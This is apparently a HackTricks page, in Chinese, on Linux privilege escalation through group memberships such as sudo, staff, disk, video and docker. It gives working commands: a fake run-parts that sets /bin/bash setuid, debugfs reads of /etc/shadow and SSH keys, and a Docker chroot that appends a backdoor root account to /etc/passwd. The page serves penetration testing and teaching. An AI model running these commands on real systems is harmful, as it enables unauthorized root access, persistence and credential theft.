# 有趣的组 - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/管理员组

### **PE - Method 1**

**有时**，系统的 **/etc/sudoers** 策略（或其中包含的文件）会包含如下条目：<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

这意味着，匹配任一条目的用户都可以通过 `sudo` 以任意目标用户身份运行任何命令（受策略其余部分的限制）。<sup>[[3]](#references)</sup>

如果是这种情况，要 **获取 root 权限，只需执行**：

```
sudo su
```

如果 `sudo -l` 允许仅使用用户名调用受限的 `adduser`，请检查该命令是否会创建一个尚不存在的同名主组。加入该组的新账户可能会获得权限，前提是生效的 sudoers 策略已向 `%group` 授予权限；在将其视为提权路径之前，请验证组创建行为和组规则。创建账户会更改系统，因此请先检查策略。

### PE - Method 2

查找所有 suid 二进制文件，并检查是否存在 **Pkexec**：

```bash
find / -perm -4000 2>/dev/null
```

如果 **pkexec 是 SUID binary**，只有在 polkit 授权所请求的操作时，它才能以其他用户身份执行程序；仅有 SUID 位并不能保证获得 root 权限。应检查已安装的策略以及目标会话的授权情况，而不要假设加入 **sudo** 或 **admin** 组就足够。<sup>[[4]](#references)[[5]](#references)</sup>

对于单独的 [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) 路径，首先确认 `pkexec` 是由 **root 拥有且带有 SUID 位**的可执行文件。如果已安装的二进制文件没有该位，就不属于公告所述的本地 SUID 提权情况。上游版本字符串只能作为线索：发行版可能会[将修复 backport 到较旧的软件包版本](https://ubuntu.com/security/CVE-2021-4034)，因此在判定其存在漏洞前，应检查已安装的软件包及缓解措施。

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) 是另一种 polkit 攻击路径：D-Bus 授权竞争条件，而不是 `pkexec` SUID 漏洞。应检查已安装的厂商 polkit 软件包，以及是否存在可访问的特权 D-Bus 操作，能够实施有用的更改；通过创建账户的路径还需要合适的服务，例如 AccountsService，而新组能否使用 sudo 取决于生效的 sudo 策略。报告的 polkit 版本或已安装的服务本身都只能作为候选线索，尤其是在厂商可能[回移修复](https://access.redhat.com/security/cve/cve-2021-3560)的情况下。被动枚举不应触发该竞争条件。

在仍使用旧版 Local Authority backend 的发行版上，可通过以下命令检查其组规则：

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

相关组名和默认设置因发行版而异；只有本地策略将某个组列为相关组时，它才有用。<sup>[[5]](#references)</sup>

要 **成为 root，可以执行**：

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

如果尝试执行 **pkexec** 并遇到此 **错误**：

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

在没有已注册 authentication agent 的 SSH 会话中，即使策略原本允许该操作，`pkexec` 也可能因以下错误而失败；polkit 将 `pkttyagent` 记载为适用于非桌面会话的文本 authentication agent。具体行为取决于版本和发行版，因此请核实本地策略和 agent 设置。对于受影响的 NixOS 版本，有报告称一种变通方法需要使用 **2 个不同的 SSH 会话**。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

拒绝某个账户访问 `su` 的 ACL 针对的是该可执行文件，而不是所有通往管理员授权操作的途径。如果管理员凭据已通过其他方式泄露，请检查生效的 polkit 策略是否允许通过 `systemd-run` 启动临时系统服务、authentication agent 接受哪个身份，以及生成的服务会使用哪个身份。[Polkit 区分以会话所有者身份进行 authentication 和以管理员身份进行 authentication](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)，而 [systemd-run 可以向系统管理器请求启动临时服务](https://systemd.io/CONTROL_GROUP_INTERFACE/)。历史记录中的条目、已安装的命令或可读取的策略文件，本身都不能证明拥有授权或凭据有效；被动审查不应提交凭据或启动 unit。

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

有时，sudoers 策略中也可能包含以下条目：

```
%wheel	ALL=(ALL:ALL) ALL
```

这意味着，匹配该条目的任何用户都可以通过 `sudo` 以任何目标用户的身份运行任何命令（受策略其余部分的限制）。<sup>[[3]](#references)</sup>

如果是这种情况，**要成为 root，只需执行**：

```
sudo su
```

## Shadow 组

在权限允许的系统上，**shadow** 组中的用户可以**读取** **/etc/shadow**；请在目标系统上验证实际的模式和 ACL：<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

所以，读取该文件并尝试**破解一些哈希**。

排查哈希时，关于锁定状态需要注意：
- 带有 `!` 或 `*` 的条目通常不能用于交互式密码登录。
- `!hash` 表示密码已被锁定；其余字符表示锁定前密码字段中的内容。
- 包含 `*` 的字段不是有效的 `crypt(3)` 哈希，且会阻止 UNIX 密码登录；不要据此推断之前是否设置过密码。
即使无法直接登录，这些信息也有助于对账户进行分类。<sup>[[6]](#references)</sup>

## Staff Group

**staff**：允许用户无需 root 权限即可在系统中添加本地修改（`/usr/local`）（请注意，`/usr/local/bin` 中的可执行文件位于所有用户的 PATH 变量中，并且可能会用同名可执行文件“覆盖”`/bin` 和 `/usr/bin` 中的可执行文件）。与“adm”组相比，该组更侧重于监控/安全。<sup>[[2]](#references)[[7]](#references)</sup>

在 `/usr/local/bin` 位于 `PATH` 中的 `/usr/bin` 之前的 Debian 配置中（如下例所示），未指定路径的命令会优先解析为 `/usr/local/bin` 中的副本；请确认目标系统上的实际 `PATH`。

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

如果特权进程通过可写的 `/usr/local/bin` 解析未限定路径的命令，替换该命令就可能以该进程的权限执行；测试前请确认实际路径和触发条件。

在 Ubuntu 系统上，登录时 `pam_motd` 会以 root 身份通过 `run-parts --lsbsysinit` 运行可执行脚本；cron 作业也可能使用 `run-parts`，但这取决于发行版和配置。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

在新的 SSH 登录时，`pspy` 可以帮助确认目标上是否实际调用了此路径；它无需 root 权限即可观察进程命令行。<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

属于 **disk** 组可能会获得对块设备的原始访问权限，并且通常**接近 root access**；Debian 将其描述为基本等同于 root，但请在目标上核实实际的设备权限和存储布局。<sup>[[7]](#references)</sup>

常见设备路径包括 `/dev/sd*`，但 NVMe 和其他存储布局使用不同的名称。

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` 适用于 ext2/ext3/ext4 文件系统；上文的 `/root` 和 `/etc/shadow` 等路径是已打开文件系统内的文件，而 `dump` 的第二个参数是本机文件系统上的输出路径。<sup>[[8]](#references)</sup> 例如，这会将已打开文件系统中的 `/tmp/asd1.txt` 提取到本机文件系统上的 `/tmp/asd2.txt`：

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` 选项会以读写模式打开文件系统，而 `write` 命令会将本机文件复制到已打开的文件系统中。避免在已挂载的运行中文件系统上使用它，因为直接编辑可能会损坏文件系统；尽可能使用离线镜像进行操作。<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

使用命令 `w` 可以查看**谁已登录系统**，输出类似如下内容。<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** 条目标识第一个 Linux 虚拟控制台；它本身并不能证明用户就在机器旁边，尤其是在容器或其他环境中。<sup>[[21]](#references)</sup>

在提供可读 framebuffer 设备的系统上，属于 **video** 组可能会授予对该设备的访问权限。Linux framebuffer 接口文档说明，`/dev/fb0` 是一种可读内存设备，可将其内容复制为屏幕快照；`/sys/class/graphics/fb0/virtual_size` 路径仅在存在该 fbdev sysfs 属性的系统上可用，因此请先检查目标系统。<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

如果已安装的 **GIMP** 版本提供原始数据导入器，请使用该导入器打开 **`screen.raw`**；不同版本和插件的支持情况与控件可能有所不同。<sup>[[22]](#references)</sup>

![磁盘组 - 视频组：要打开原始图像，可以使用 GIMP，选择 screen.raw 文件，并将文件类型设为 Raw image data](<../../../images/image (463).png>)

将图像的宽度和高度设置为与帧缓冲区几何尺寸相匹配；尝试可用的像素格式/图像类型，直到输出清晰可辨。<sup>[[9]](#references)</sup>

![磁盘组 - 视频组：然后将宽度和高度修改为屏幕使用的尺寸，并尝试不同的图像类型（选择显示效果最好的那个）](<../../../images/image (317).png>)

## Root 组

加入 **root** 组并不会获得 root 的 UID，但由 `root` 所有且组可写的文件仍值得关注，尤其是特权服务或库会使用这些文件时。在将其视为权限提升途径之前，请先确认文件的实际权限及其用途。

**检查 root 组成员可以修改哪些文件**：

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

在标准 rootful 安装中，加入 `docker` 组即可获得对 Docker daemon 的 root 级访问权限。由于 bind mount 默认具有读写权限，能够控制该 daemon 的用户可以将主机的 `/` 挂载到容器中并修改主机文件；这实际上等同于在主机上获得 root 权限。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

`/etc/group`、`/etc/gshadow` 与当前进程令牌中的组成员信息可能不同步。如果用户未出现在 `id -nG` 的输出中，但执行 `newgrp docker` 成功，请在新 shell 中检查 `id` 显示的组，并确认 Docker socket 是否确实可写且由 rootful daemon 提供服务。仅凭组名无法确认用户能够控制主机。对任何自动化的 `newgrp` 探测设置超时，避免密码提示导致枚举卡住。

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

最后，如果你不喜欢前面的任何建议，或者它们因某些原因不起作用（例如 Docker API 防火墙？），你也可以尝试**运行一个 privileged container 并从中逃逸**，具体方法见此处：

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

如果你对 Docker socket 有写入权限，请阅读[**这篇介绍如何滥用 Docker socket 提权的文章**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 组

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm 组

通常，**`adm` 组的成员**有权限**读取日志**文件，这些文件位于 _/var/log/_ 中。\
因此，如果你攻陷了该组中的用户，务必**查看日志**。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail 组

这些组的含义因服务和发行版而异。Debian 文档说明，`backup` 组用于委派备份/还原，`lp` 组用于打印机守护进程，`mail` 组则用于访问 `/var/mail`；因此，在将组成员身份视为提权路径之前，先检查本地权限。<sup>[[7]](#references)</sup>

它们通常是**凭据发现**途径，而不是直接获取 root 权限的途径：
- **backup**：可能暴露包含配置、密钥、数据库转储或令牌的归档文件。
- **operator**：特定于平台的运维访问权限，可能泄露敏感的运行时数据。
- **lp**：打印队列/假脱机文件可能包含文档内容。
- **mail**：邮件假脱机文件可能暴露密码重置链接、OTP 和内部凭据。

应将此类组成员身份视为高价值数据泄露问题，并尝试利用密码/令牌复用进行横向拓展。

## Auth 组

在 OpenBSD 上，如果配置了 S/Key，`/etc/skey` 的所有者为 `root:auth`，访问其中的记录需要 `auth` 组权限；YubiKey 记录则存储在 `/var/db/yubikey` 中。<sup>[[16]](#references)[[17]](#references)</sup> 某个启用了 S/Key 或 YubiKey 的 OpenBSD 6.6 易受攻击配置，允许拥有 `auth` 权限的本地用户获取 root 权限；Qualys 记录了其前提条件和 exploit 链，链接中的 PoC 实现了该攻击。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [无需 GUI 会话的 pkexec/pkttyagent 身份验证（NixOS issue #18012）](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian 手册页](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit 参考手册](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit 参考手册](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian 安全手册](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux 手册页](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [帧缓冲设备 — Linux 内核文档](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu 手册页](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian 手册页](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — 非特权 Linux 进程嗅探工具](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine 安全性](https://docs.docker.com/engine/security/)
- [14] [以非 root 用户身份管理 Docker](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [运行容器 — Docker 文档](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD 手册页](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD 手册页](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD 中的身份验证漏洞 — Qualys 安全公告](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — 本地 exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux 已分配设备（4.x+ 版本）](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [图像导入和导出 — GIMP 文档](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
